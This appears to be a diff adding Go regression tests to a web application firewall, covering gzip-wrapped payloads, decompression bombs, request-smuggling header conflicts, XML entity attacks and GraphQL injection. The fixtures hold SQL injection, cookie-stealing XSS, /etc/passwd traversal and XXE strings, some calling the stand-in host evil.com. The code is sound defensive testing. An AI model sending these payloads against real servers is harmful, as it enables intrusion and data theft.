@@ -23,6 +23,8 @@ package gwaf_test
 //     firewalls.
 
 import (
+	"bytes"
+	"compress/gzip"
 	"encoding/base64"
 	"fmt"
 	"strings"
@@ -1414,5 +1416,343 @@ func TestBase64BodiesAreCheap(t *testing.T) {
 		t.Errorf("a %d KiB base64 upload cost %d fuel, want under %d — "+
 			"encoded binary is being read as prose again",
 			len(enc)>>10, got, maxFuel)
+	}
+}
+
+// ---- transport shapes: compression, framing, XML ---------------------------
+
+func gzipBytes(t *testing.T, s string) []byte {
+	t.Helper()
+	var b bytes.Buffer
+	w := gzip.NewWriter(&b)
+	if _, err := w.Write([]byte(s)); err != nil {
+		t.Fatal(err)
+	}
+	if err := w.Close(); err != nil {
+		t.Fatal(err)
+	}
+	return b.Bytes()
+}
+
+// TestCompressedBodiesAreDecoded is the regression test for a total bypass.
+//
+// A compressed body is opaque: there is no grammar in a DEFLATE stream, so
+// every detector found nothing and the request was reported clean while the
+// origin decompressed it and acted on the payload. The entire firewall was
+// switched off by one header, and the same payload sent plainly was blocked.
+func TestCompressedBodiesAreDecoded(t *testing.T) {
+	w := newWAF(t)
+
+	payloads := []string{
+		`{"q":"1 UNION SELECT password FROM users"}`,
+		`{"c":"<script>alert(document.cookie)</script>"}`,
+		`{"p":"../../etc/passwd"}`,
+	}
+
+	for _, p := range payloads {
+		t.Run(p[:min(len(p), 28)], func(t *testing.T) {
+			for _, declared := range []bool{true, false} {
+				name := "declared"
+				if !declared {
+					// An origin that sniffs decompresses a body whose header
+					// says nothing, and gwaf does not know whether this one
+					// does. Both readings are evaluated.
+					name = "undeclared"
+				}
+				t.Run(name, func(t *testing.T) {
+					tx := w.NewTransaction()
+					defer tx.Close()
+
+					tx.SetRequestLine("POST", "/api", "HTTP/1.1")
+					tx.AddRequestHeader("Content-Type", "application/json")
+					if declared {
+						tx.AddRequestHeader("Content-Encoding", "gzip")
+					}
+					tx.ProcessRequestHeaders()
+					tx.SetRequestBody(gzipBytes(t, p))
+
+					if d := tx.ProcessRequestBody(); !d.Blocked() {
+						t.Errorf("payload inside a gzip body was not inspected: %s", p)
+					}
+				})
+			}
+		})
+	}
+}
+
+func TestBenignCompressedBodiesPass(t *testing.T) {
+	w := newWAF(t)
+
+	for _, p := range []string{
+		`{"name":"Alice","qty":3,"note":"please deliver before 5pm"}`,
+		`{"data":"` + strings.Repeat("ordinary content ", 5000) + `"}`,
+		`{"c":"use the <b>bold</b> tag"}`,
+	} {
+		t.Run(p[:min(len(p), 28)], func(t *testing.T) {
+			tx := w.NewTransaction()
+			defer tx.Close()
+
+			tx.SetRequestLine("POST", "/api", "HTTP/1.1")
+			tx.AddRequestHeader("Content-Type", "application/json")
+			tx.AddRequestHeader("Content-Encoding", "gzip")
+			tx.ProcessRequestHeaders()
+			tx.SetRequestBody(gzipBytes(t, p))
+
+			if d := tx.ProcessRequestBody(); d.Blocked() {
+				t.Errorf("benign gzip body blocked: rule=%d reason=%v detail=%q",
+					d.RuleID(), d.Reason(), d.Detail())
+			}
+		})
+	}
+}
+
+// TestUndecodableEncodingIsNotClean covers the encodings gwaf cannot undo.
+//
+// Brotli needs a third-party library the core module will not carry, so a
+// brotli body cannot be inspected. Passing it through would restore the bypass
+// exactly — one header, and the firewall is off — so it is reported instead and
+// the deployment's fail mode decides.
+func TestUndecodableEncodingIsNotClean(t *testing.T) {
+	w := newWAF(t)
+
+	for _, enc := range []string{"br", "brotli", "exotic", "gzip, br"} {
+		t.Run(enc, func(t *testing.T) {
+			tx := w.NewTransaction()
+			defer tx.Close()
+
+			tx.SetRequestLine("POST", "/api", "HTTP/1.1")
+			tx.AddRequestHeader("Content-Type", "application/json")
+			tx.AddRequestHeader("Content-Encoding", enc)
+			tx.ProcessRequestHeaders()
+			tx.SetRequestBody([]byte("\x1b\x3f\x00\x00\x24\xb0\xe2\x99\x80\x12"))
+
+			d := tx.ProcessRequestBody()
+			if !d.Blocked() {
+				t.Errorf("an undecodable body was reported clean")
+			}
+			if d.Reason() != gwaf.ReasonUndecidable {
+				t.Errorf("Reason() = %v, want ReasonUndecidable", d.Reason())
+			}
+		})
+	}
+}
+
+// TestDecompressionBombIsBounded checks that a small request cannot become a
+// large allocation. Ratios of a thousand to one are ordinary and crafted
+// streams reach far higher.
+func TestDecompressionBombIsBounded(t *testing.T) {
+	w := newWAF(t)
+
+	bomb := gzipBytes(t, strings.Repeat("\x00", 8<<20))
+	if len(bomb) > 64<<10 {
+		t.Fatalf("test bomb is %d bytes, expected a small one", len(bomb))
+	}
+
+	tx := w.NewTransaction()
+	defer tx.Close()
+
+	tx.SetRequestLine("POST", "/api", "HTTP/1.1")
+	tx.AddRequestHeader("Content-Type", "application/json")
+	tx.AddRequestHeader("Content-Encoding", "gzip")
+	tx.ProcessRequestHeaders()
+	tx.SetRequestBody(bomb)
+
+	d := tx.ProcessRequestBody()
+	if !d.Blocked() {
+		t.Error("a decompression bomb was accepted")
+	}
+	if !strings.Contains(d.Detail(), "exceeds limit") {
+		t.Errorf("Detail() = %q, want it to name the size limit", d.Detail())
+	}
+}
+
+// TestFramingAmbiguityIsRejected is request smuggling.
+//
+// An attacker sends a request whose length one server computes from
+// Content-Length and another from Transfer-Encoding. The two disagree about
+// where it ends, and the bytes past the boundary become the start of a
+// *different* request the front end never inspected. No rule can catch it: by
+// the time rules run, gwaf is already looking at whichever request it happened
+// to reconstruct.
+//
+// docs/CONCEPT.md §11 specified this and it was never built until a probe
+// showed a CL.TE conflict passing cleanly.
+func TestFramingAmbiguityIsRejected(t *testing.T) {
+	w := newWAF(t)
+
+	cases := []struct {
+		name    string
+		headers [][2]string
+	}{
+		{"CL and TE together", [][2]string{
+			{"Content-Length", "6"}, {"Transfer-Encoding", "chunked"}}},
+		{"TE with leading space", [][2]string{
+			{"Transfer-Encoding", " chunked"}}},
+		{"TE with trailing tab", [][2]string{
+			{"Transfer-Encoding", "chunked\t"}}},
+		{"non-numeric CL", [][2]string{
+			{"Content-Length", "6, 6"}}},
+		{"CL with units", [][2]string{
+			{"Content-Length", "6 bytes"}}},
+		{"conflicting CL values", [][2]string{
+			{"Content-Length", "6"}, {"Content-Length", "12"}}},
+	}
+
+	for _, tt := range cases {
+		t.Run(tt.name, func(t *testing.T) {
+			tx := w.NewTransaction()
+			defer tx.Close()
+
+			tx.SetRequestLine("POST", "/api", "HTTP/1.1")
+			for _, h := range tt.headers {
+				tx.AddRequestHeader(h[0], h[1])
+			}
+
+			d := tx.ProcessRequestHeaders()
+			if !d.Blocked() {
+				t.Errorf("ambiguous framing accepted: %v", tt.headers)
+			}
+			if d.Reason() != gwaf.ReasonDesync {
+				t.Errorf("Reason() = %v, want ReasonDesync", d.Reason())
+			}
+		})
+	}
+}
+
+func TestUnambiguousFramingIsAccepted(t *testing.T) {
+	w := newWAF(t)
+
+	cases := []struct {
+		name    string
+		headers [][2]string
+	}{
+		{"content-length only", [][2]string{{"Content-Length", "7"}}},
+		{"transfer-encoding only", [][2]string{{"Transfer-Encoding", "chunked"}}},
+		{"repeated identical CL", [][2]string{
+			{"Content-Length", "7"}, {"Content-Length", "7"}}},
+		{"neither", nil},
+		{"TE gzip chunked", [][2]string{{"Transfer-Encoding", "gzip, chunked"}}},
+	}
+
+	for _, tt := range cases {
+		t.Run(tt.name, func(t *testing.T) {
+			tx := w.NewTransaction()
+			defer tx.Close()
+
+			tx.SetRequestLine("POST", "/api", "HTTP/1.1")
+			for _, h := range tt.headers {
+				tx.AddRequestHeader(h[0], h[1])
+			}
+			if d := tx.ProcessRequestHeaders(); d.Blocked() {
+				t.Errorf("unambiguous framing rejected: %v reason=%v detail=%q",
+					tt.headers, d.Reason(), d.Detail())
+			}
+		})
+	}
+}
+
+// TestXMLEntityAttacks covers XXE and expansion bombs, and the SOAP traffic
+// that must keep working alongside them.
+func TestXMLEntityAttacks(t *testing.T) {
+	w := newWAF(t)
+
+	attacks := []struct{ name, body string }{
+		{"XXE file", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`},
+		{"XXE remote", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/x">]><foo>&xxe;</foo>`},
+		{"billion laughs", `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><lolz>&lol2;</lolz>`},
+		{"parameter entity", `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://evil.com/e">%remote;]><r/>`},
+		{"sqli in element", `<?xml version="1.0"?><order><id>1 UNION SELECT password FROM users</id></order>`},
+	}
+	for _, a := range attacks {
+		t.Run(a.name, func(t *testing.T) {
+			tx := w.NewTransaction()
+			defer tx.Close()
+			tx.SetRequestLine("POST", "/svc", "HTTP/1.1")
+			tx.AddRequestHeader("Content-Type", "application/xml")
+			tx.ProcessRequestHeaders()
+			tx.SetRequestBody([]byte(a.body))
+			if d := tx.ProcessRequestBody(); !d.Blocked() {
+				t.Errorf("XML attack not detected: %s", a.name)
+			}
+		})
+	}
+
+	benign := []struct{ name, body, ctype string }{
+		{"soap envelope", `<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">` +
+			`<soap:Body><GetOrder xmlns="urn:orders"><OrderId>12345</OrderId>` +
+			`<Note>please deliver before 5pm</Note></GetOrder></soap:Body></soap:Envelope>`,
+			"text/xml; charset=utf-8"},
+		{"plain xml", `<?xml version="1.0"?><order><id>1</id><customer>O'Brien</customer><total>42.00</total></order>`,
+			"application/xml"},
+		{"xml with doctype", `<?xml version="1.0"?><!DOCTYPE html><html><body><p>text</p></body></html>`,
+			"application/xhtml+xml"},
+	}
+	for _, b := range benign {
+		t.Run(b.name, func(t *testing.T) {
+			tx := w.NewTransaction()
+			defer tx.Close()
+			tx.SetRequestLine("POST", "/svc", "HTTP/1.1")
+			tx.AddRequestHeader("Content-Type", b.ctype)
+			tx.ProcessRequestHeaders()
+			tx.SetRequestBody([]byte(b.body))
+			if d := tx.ProcessRequestBody(); d.Blocked() {
+				t.Errorf("benign XML blocked: rule=%d msg=%q", d.RuleID(), d.Message())
+			}
+		})
+	}
+}
+
+// TestGraphQLTrafficPasses covers queries, subscriptions, and introspection,
+// alongside injection through a GraphQL argument.
+func TestGraphQLTrafficPasses(t *testing.T) {
+	w := newWAF(t)
+
+	benign := []string{
+		`{"query":"query GetOrders($first:Int!){ orders(first:$first){ id total } }","variables":{"first":10}}`,
+		`{"id":"1","type":"subscribe","payload":{"query":"subscription { orderUpdated { id status } }"}}`,
+		`{"query":"{ __schema { types { name fields { name } } } }"}`,
+		`{"query":"mutation { createOrder(input:{sku:\"SKU-1\",qty:2}){ id } }"}`,
+	}
+	for _, q := range benign {
+		t.Run(q[:min(len(q), 30)], func(t *testing.T) {
+			tx := w.NewTransaction()
+			defer tx.Close()
+			tx.SetRequestLine("POST", "/graphql", "HTTP/1.1")
+			tx.AddRequestHeader("Content-Type", "application/json")
+			tx.ProcessRequestHeaders()
+			tx.SetRequestBody([]byte(q))
+			if d := tx.ProcessRequestBody(); d.Blocked() {
+				t.Errorf("benign GraphQL blocked: rule=%d msg=%q", d.RuleID(), d.Message())
+			}
+		})
+	}
+
+	tx := w.NewTransaction()
+	defer tx.Close()
+	tx.SetRequestLine("POST", "/graphql", "HTTP/1.1")
+	tx.AddRequestHeader("Content-Type", "application/json")
+	tx.ProcessRequestHeaders()
+	tx.SetRequestBody([]byte(`{"query":"{ user(id:\"1' OR 1=1--\"){ name } }"}`))
+	if d := tx.ProcessRequestBody(); !d.Blocked() {
+		t.Error("injection through a GraphQL argument was not detected")
+	}
+}
+
+// TestProtocolVersionsAllPass checks that no protocol-conformance assumption
+// crept in. HTTP/2 and HTTP/3 carry no Content-Length and no Accept header by
+// default, which is what breaks CRS-derived rulesets.
+func TestProtocolVersionsAllPass(t *testing.T) {
+	w := newWAF(t)
+
+	for _, proto := range []string{"HTTP/1.0", "HTTP/1.1", "HTTP/2.0", "HTTP/3.0"} {
+		t.Run(proto, func(t *testing.T) {
+			tx := w.NewTransaction()
+			defer tx.Close()
+			tx.SetRequestLine("GET", "/api/v1/orders/12345", proto)
+			tx.AddRequestHeader("User-Agent", "Mozilla/5.0")
+			if d := tx.ProcessRequestHeaders(); d.Blocked() {
+				t.Errorf("%s blocked: rule=%d", proto, d.RuleID())
+			}
+		})
 	}
 }
